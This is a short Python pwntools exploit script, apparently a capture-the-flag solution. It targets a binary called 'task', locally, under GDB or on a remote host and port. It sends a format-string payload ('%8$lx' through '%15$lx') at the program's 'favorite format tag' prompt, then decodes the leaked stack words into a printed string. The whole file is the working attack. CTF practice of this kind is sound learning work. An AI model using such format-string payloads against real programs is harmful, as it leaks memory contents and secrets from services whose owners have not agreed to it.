from pwn import *
from itertools import takewhile

elf = context.binary = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main+182",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)

p.recvuntil(b'What is your favorite format tag? ', drop=True)

p.sendline(b'%8$lx.%9$lx.%10$lx.%11$lx.%12$lx.%13$lx.%14$lx.%15$lx')
leaked = p.recvline().decode().strip().split('.')
leaked = map(lambda x: unhex(str(x))[::-1], leaked)
leaked = takewhile(lambda x: x != ord('\n'), list(b''.join(leaked)))
print(''.join(map(chr, leaked)))
